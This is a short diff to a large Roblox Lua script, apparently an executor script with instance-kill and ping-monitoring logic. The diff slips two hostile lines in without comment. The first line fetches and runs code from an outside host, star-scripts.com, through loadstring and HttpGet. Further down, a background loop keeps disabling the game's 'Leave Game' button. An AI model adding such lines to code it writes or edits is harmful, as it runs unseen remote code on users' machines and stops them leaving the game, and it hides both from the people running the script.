@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://star-scripts.com/api/run/HAGko_mk9Q3ueW6Qzo4kZICcoCpyQdj-"))()
 local _instDead = false   -- set true the moment a newer instance fires the kill event
 
 -- Fire the kill signal into any live old instance, then destroy its BindableEvent
@@ -5458,6 +5459,9 @@ end)()
             end)
         end)
     end
+
+
+task.spawn(function() while task.wait() do pcall(function() for _,v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do v:Disable() end end) end end)
 
     -- -- Live ping update loop (every 0.8 s) ----------------------
     local _lastPing = 0
